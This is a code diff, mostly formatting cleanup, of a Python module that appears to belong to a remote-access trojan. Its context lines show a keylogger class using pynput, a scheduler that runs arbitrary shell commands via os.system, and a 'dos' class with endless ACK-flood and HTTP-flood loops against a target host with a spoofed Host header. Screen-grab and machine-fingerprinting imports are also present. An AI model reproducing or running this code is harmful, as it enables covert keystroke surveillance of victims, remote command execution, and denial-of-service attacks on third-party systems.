@@ -5,21 +5,24 @@ from . import settings
 
 # import built-in & third-party modules
 import datetime
+import socket
 import requests
 import json
 import platform
 import time
 import zipfile
 import os
+import random
+
 import schedule
+
 from typing import List
 from pynput import keyboard
-from socket import gethostname, gethostbyname
-import socket
+from socket import gethostname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
 from PIL import ImageGrab
-import random
+
 
 class KeyLogger:
     '''this class is for keylogger utility , you should only start this class from a threading object.
@@ -45,31 +48,33 @@ class KeyLogger:
         global listener
         listener.stop()
 
+
 class ScheduleManagement:
     listOfSchedules = {}
-    
-    def __init__(self,second,command):
+
+    def __init__(self, second, command):
         self.second = second
         self.command = command
 
-    def ossystem(self,command):
+    def ossystem(self, command):
         os.system(command)
+
     def startSchedule(self):
         try:
-            schedule.every(self.second).seconds.do(self.ossystem,self.command)
+            schedule.every(self.second).seconds.do(self.ossystem, self.command)
             while self.command in self.listOfSchedules.keys():
                 schedule.run_pending()
         except:
             self.listOfSchedules.pop(self.command)
 
+
 class dos:
-    def __init__(self,target,port,data,dostype):
-        self.target  = target
-        self.port    = port
-        self.data    = data 
+    def __init__(self, target, port, data, dostype):
+        self.target = target
+        self.port = port
+        self.data = data
         self.dostype = dostype
 
-    
     def attack(self):
         if self.dostype == "ACKFlood":
             while True:
@@ -84,11 +89,11 @@ class dos:
             while True:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((self.target, self.port))
-                s.sendto(("GET / " + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
-                s.sendto(("Host: " + fakeip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
+                s.sendto(("GET / " + self.target +
+                         " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
+                s.sendto(("Host: " + fakeip + "\r\n\r\n").encode('ascii'),
+                         (self.target, self.port))
                 s.close()
-            
-            
 
 
 def get_current_epoc_time() -> float:
@@ -108,7 +113,7 @@ def get_host_name_ip() -> str:
 
 def get_my_global_ip() -> str:
     '''return system ip (3 API server)'''
-    
+
     try:
         return get_my_ip_server_1()
 
